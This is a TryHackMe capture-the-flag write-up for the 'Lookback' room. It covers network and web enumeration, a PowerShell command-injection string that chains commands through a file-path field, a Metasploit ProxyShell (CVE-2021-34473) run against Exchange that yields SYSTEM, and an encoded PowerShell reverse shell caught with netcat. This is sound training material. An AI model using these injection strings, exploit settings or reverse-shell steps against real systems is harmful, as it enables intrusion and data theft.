# 🧠 TryHackMe Room: Lookback 

**Room URL:** [https://tryhackme.com/room/lookback](https://tryhackme.com/room/lookback)  
**Author:** Schenkee  
**Profile:** [https://tryhackme.com/p/schenkee](https://tryhackme.com/p/schenkee)  

---

## 🧩 Overview  

**Objective:**  
This guide covers the steps required to solve all tasks in the Lookback room. The challenge involves web enumeration, command injection, and exploiting a vulnerable version of Microsoft Exchange. This room is marketed as an Active Directory room but is just one machine running as a DC with many normal DC ports being blocked, making it a bit odd to work with. At the end of the guide, I breakdown some problems I was having getting a reverse shell due to encoding issues and the resolution.  

---

## 🧰 Tools I Used  
- nmap
- ffuf
- Nikto
- Metasploit

---

Firstly, let’s start our target machine and give it a few minutes to start all relevant services. We can also either start the AttackBox or as in my case connect our own machine to the TryHackMe VPN.  

---

## 🛠️ Initial Recon & Enumeration 

To confirm the target is up and running run a TCP SYN Ping as ICMP is blocked as per the CTF intro details.

```bash
sudo nmap -PS -sn TARGET_IP
```

#### ⚙️ **Options**   
**sudo** Needed to run this command as a privileged user otherwise it will perform a 3-way-handshake.  
**-PS** Tells nmap to perform a TCP SYN ping against the target.  
**-sn** Tells nmap to perform host discovery only, no port scanning.  

This confirmed the target was up and reachable from the attacking machine.  
![Recon - nmap PS.png](./Images/Recon%20-%20nmap%20PS.png)  

Now that the target has been verified to be online. Perform a standard nmap port scan as below.  
```bash
sudo nmap -sS TARGET_IP
```

#### ⚙️ **Options**   
**sudo** Needed to run this command as a privileged user otherwise it will perform a 3-way-handshake and be a TCP Connect Scan -sT.  
**-sS** Tells nmap to perform a TCP SYN Scan.  

This returns information that 3 ports are open. 80 and 443 related to web sites and 3389 for RDP.  
![Recon - nmap small.png](./Images/Recon%20-%20nmap%20small.png)  

Now for the final nmap scan let us target these 3 ports with a version scan and nmap default scripts to try learn more specific details about each service.  
```bash
sudo nmap -sS -sV -sC TARGET_IP -p 80,443,3389
```
#### ⚙️ **Options**   
**sudo** Needed to run this command as a privileged user otherwise it will perform a 3-way-handshake and be a TCP Connect Scan -sT.  
**-sS** Tells nmap to perform a TCP SYN Scan.  
**-sV** Tells nmap to perform version scanning, which is required for running scripts.  
**-sC** Tells nmap to run default scripts against the ports.  
**-p** Tells nmap which ports to scan.  

This returns some further interesting details.  We learn that the computer is called ```WIN-12OUO7A66M7```  and is on the ```thm.local``` domain. 
![Recon - nmap big.png](./Images/Recon%20-%20nmap%20big.png)

The above found details can be added to the ```/etc/hosts``` file to allow us to navigate directly to ```http://WIN-12OUO7A66M7.thm.local```.  Open the ```etc/hosts``` file in a text editor and add the line as below. This will require root privileges.  
```bash
sudo nano /etc/hosts
TARGET_IP  WIN-12OUO7A66M7.thm.local
```
Save and exit the file.  
![Recon - etc hosts.png](./Images/Recon%20-%20etc%20hosts.png)  

Now that this has been setup a quick manual check can be done on ```http://WIN-12OUO7A66M7.thm.local``` and ```https://WIN-12OUO7A66M7.thm.local```  

Going to port ```80``` did not reveal anything other than a blank page.  

But going to port ```443``` via ```https://WIN-12OUO7A66M7.thm.local``` did reveal an Outlook login panel.
![Recon - outlook.png](./Images/Recon%20-%20outlook.png)  
This will come in handy later, but for now continue with more recon.  

Next up time for some directory enumeration.  I had first attempted to use ```gobuster``` but did not have much luck. So turned to fuff using the below command.  
```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -u https://WIN-12OUO7A66M7.thm.local/FUZZ -fw 1
```

#### ⚙️ **Options**   
**-w** Points ffuf to the chosen wordlist to insert into the ```FUZZ``` position.  
**-u** Provides ffuf with the target url.  
**-fw** Is used to filter the result by the number of words in the response. This is used to filter out any response with 1 word and helps reduce the returned information.  
![Recon - fuff.png](./Images/Recon%20-%20ffuf.png)  

The most interesting hit returned is on the word ```test``` which contains 30 lines and 81 words. Far higher than any other response. 
![Recon - fuff result.png](./Images/Recon%20-%20fuff%20result.png)  

When manually navigating to
```url
https://WIN-12OUO7A66M7.thm.local/test
```
A login panel pops open. This looks very promising and will be our initial access point.  
![Flag 1 - login.png](./Images/Flag%201%20-%20login.png)

To round off the recon and enumeration stage a final scan can be undertaken via Nikto. 
```bash
nikto -h https://WIN-12OUO7A66M7.thm.local
```

#### ⚙️ **Options**   
**-h** Provides Nikto with the target host or web server to be scanned.  

This takes a while to run but turns out to be very worthwhile as Nikto was able to report found default credentials in the page ```https://WIN-12OUO7A66M7.thm.local/test```  
![Recond - Nikto.png](./Images/Recon%20-%20Nikto.png)  
This will be the pathway into the target and the first two flags.  

---

## 🛠️ Flag 1 

In a browser navigate to the found login panel.  
```url
https://WIN-12OUO7A66M7.thm.local/test
```
![Flag 1 - login.png](./Images/Flag%201%20-%20login.png)  

Enter the ```Username``` and ```Password``` found during the Nikto scan.  If successful login should be achieved and the first flag found.  
![Flag1 - flag.png](./Images/Flag1%20-%20flag.png)

---

## 🛠️ Flag 2

The interface presented after logging in looks like a command panel. There is already some input text and if the ```Run``` button is pressed nothing noticeable seem to happen. Remove the text and enter in ```whoami``` This returns an error, but the error message has some very useful information about how the panel handling the string entered the ```Path:``` box.  

```powershell
Get-Content : Cannot find path 'C:\whoami' because it does not exist.
At line:1 char:1
+ Get-Content('C:\whoami')
+ ~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : ObjectNotFound: (C:\whoami:String) [Get-Content], ItemNotFoundException
    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.GetContentCommand
```

It appears as though the text being entered into the box is being passed to ```Get-Content``` as a string and appended to ```C:\```. It might be possible to pass a second variable.  

Enter the following into the box to try run ```whoami```  
```powershell
BitLockerActiveMonitoringLogs'); whoami; #
```  
This worked and the whoami was executed and the result returned. We have command injection as the thm\admin user!  
![Flag 1 -whoami.png](./Images/Flag%201%20-%20whoami.png)  

This worked because ```')``` closes out the ```Get-Content('...')``` string. The ```;``` that follows lets PowerShell chain a new command which runs independently. The ```#``` at the end comments out any trailing text so the rest of the original wrapper is ignored.  



Have a look around the file system for anything interesting. I started off by outputting the contents of the ```c:\users``` directory to try identifying the users on the machine.
```powershell
BitLockerActiveMonitoringLogs'); dir c:\users; #
```
![Flag2 - users.png](./Images/Flag2%20-%20users.png)  
Here two other users are located ```dev``` and ```Administrator```

When trying to access ```Administrator``` folders a ```Access Denied``` error was returned. As such move onto the ```dev``` user.

```powershell
BitLockerActiveMonitoringLogs'); dir c:\users\dev\Desktop; #
```
Revealed two interesting looking text files.  
![Flag2 - files.png](./Images/Flag2%20-%20files.png)

Using the ```type``` command output the contents of each of the two found files.

Firstly the ```TODO.txt``` file
```powershell
BitLockerActiveMonitoringLogs'); type c:\users\dev\Desktop\TODO.txt; #
```  
![Flag2 - Todo.png](./Images/Flag2%20-%20Todo.png)  
This provides some further information. Here are three email addresses and a mention that the MS Exchange instance requires a security update.  

Now the ```user.txt``` file
```powershell
BitLockerActiveMonitoringLogs'); type c:\users\dev\Desktop\user.txt; #
```  
![Flag2 - flag.png](./Images/Flag2%20-%20flag.png)   
Here is the second flag!  

---

## 🛠️ Flag 3

Now at this stage I wanted to get a reverse shell on the target and see if this would allow further recon and a possible path to escalate my privileges. I spent what seemed like far too long trying to get a shell without any luck and as I started to get frustrated thought it’s time to have a look at the Outlook portal to see if that might offer something interesting. I did manage to get a shell after completing the room and have provided some details below.  

Open a web browser and navigate to the Outlook login page.  
```url
https://WIN-12OUO7A66M7.thm.local
```  
Use the previously found set of credentials to try logging in. Which did work, but it seemed the user had no attached mailbox. There were however some useful details in the output error as below.  
```general
"A mailbox couldn't be found for THM\admin."
This also returned some version information
X-ClientId: F971CA54BC9F45678DE5353728A8E7E2
request-id 556840fd-b354-4345-91b6-3fdaaddcb76c
X-OWA-Error Microsoft.Exchange.Data.Storage.UserHasNoMailboxException
X-OWA-Version 15.2.858.2
X-FEServer WIN-12OUO7A66M7
X-BEServer WIN-12OUO7A66M7
Date:9/15/2025 11:17:09 AM
```

When researching ```X-OWA-Version 15.2.858.2``` is the version identifier for Outlook Web App (OWA) component on ```Exchange Server 2019``` which lead me look for specific vulnerabilities in Exchange 2019. 
After some searching I found this:
```url
https://www.rapid7.com/db/modules/exploit/windows/http/exchange_proxyshell_rce/
```
This looked very promising, so start up Metasploit via
```bash
msfconsole
```

From here I followed the details on the website and configured the settings needed for the ```exchange_proxyshell_rce```
```console
msfconsole
use exploit/windows/http/exchange_proxyshell_rce
show options
set RHOST win-12ouo7a66m7.thm.local
set Email joe@thm.local
set LHOST ATTACKER_IP
run
```
![Flag3 - msf options.png](./Images/Flag3%20-%20msf%20options.png)  
![Flag3 - msf error.png](./Images/Flag3%20-%20msf%20error.png)  
Error! This did not work as expected, it seems that ```joe@thm.local``` does not actually exist. But one thing this output did confirm is that the Exchange Server is vulnerable to ```CVE-2021-34473```  

There are two other emails that were found earlier in the ```TODO.txt``` file. Try one of these  
```console
set EMAIL dev-infrastracture-team@thm.local
```  
![Flag3 - msf success.png](./Images/Flag3%20-%20msf%20success.png)  
Success!  

Check the user Meterpreter is running as using 
```console
getuid
```
This should return ```NT AUTHORITY\\SYSTEM``` which will allow access to the ```Administrator``` directory for the final flag.  

First, a look at the ```Administrator``` Desktop but this returns nothing.  
```console
ls c:\\users\\Administrator\\Desktop
```
![Flag3 - Desktop.png](./Images/Flag3%20-%20Desktop.png)  
Remember to use double ```\\``` when navigating Windows paths in Meterpreter. Using a single ```\``` will get interpreted as an escape character.  

Next have a look at the ```Documents``` folder.  
```console
ls c:\\users\\Administrator\\Documents
```  
Perfect here is the final flag in the ```flag.txt``` file. Output this via ```cat```  
```console
cat c:\\users\\Administrator\\Documents\\flag.txt
```  
![Flag3 - flag.png](./Images/Flag3%20-%20flag.png)

Done! All three flags have now been found!

---

## 🔎 Reverse shell troubleshooting  
As I have mentioned a couple of times, I had some problems in gaining reverse shell access via executing a payload in the command panel and catching it with netcat. I could not understand why this was not working, I was using a well-known windows PowerShell online reverse shell. I was passing this payload into the command panel encoded in base64 to avoid any errors due to the ugliness of the payload.  

As such I looked around online at a few walk throughs of the Lookback room and found that other users had managed to get the exact same reverse shell to work. I even followed the exact steps another user had taken and still was not able to get it to work. Again, I started to feel frustrated that I could not get it to work. So, I copied the other users base64 encoded payload and decoded it here: [https://appdevtools.com/base64-encoder-decoder](https://appdevtools.com/base64-encoder-decoder) this confirmed to me that I was using the exact same payload. So, I updated the IP to my attacking machine, re-encoded it to base64 and error...  

Now I was stumped, how could I decode a working payload, adjust the IP and re-encode it and get errors with PowerShell not being able to process the commands. Now I just straight up copied the other user’s payload and tried running it, knowing this would error due to IP mismatch, but hoping I would get some feedback that the payload was interpreted by PowerShell, and it was...

Ok so it must be an encoding issue, and this is where I learnt a valuable lesson about the nuances of Base64 encoding. See the [https://appdevtools.com/base64-encoder-decoder](https://appdevtools.com/base64-encoder-decoder) website was encoding the payload in UTF-8/ASCII encoded Base64. But ```powershell -e``` (```-e``` is short for ```-EncodedCommand```) expects UTF-16LE encoded Base64. Now I had the solution and attempted it again.

I got the payload from here: [https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#powershell](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#powershell)  Using the second PowerShell payload provided.  

Only the information provided between the double quotes is needed. I updated my IP details and encoded the payload here: [https://www.base64encode.org/](https://www.base64encode.org/)  

Ensuring I set the character set to ```UTF-16LE```  
![Extra - Base64.png](./Images/Extra%20-%20Base64.png)  

I then started a netcat listener and enter the payload into the command panel as below.  
```Powershell
BitLockerActiveMonitoringLogs'); powershell -e PAYLOAD_STRING; #
```  
It worked!  
![Extra Netcat.png](./Images/Extra%20Netcat.png)  

This made me very happy. I was able to troubleshoot the issue successfully and, on the way, learnt something extra which will certainly aid me in the future.  

---

## 🧠 Takeaways  
- Gained an understanding of Base64 encoding nuances in PowerShell (UTF-16LE vs UTF-8/ASCII)  
- Troubleshooting experience in resolving reverse shell issues  
- Hands-on experience using recon and enumeration tools (nmap, ffuf, Nikto)  
- Practical use of Metasploit to exploit CVE-2021-34473   
- Learned how PowerShell command injection works (closing string, injecting with ```;```, commenting with ```#```)  

---

Thank you for following through my guide of the TryHackMe Lookback room.
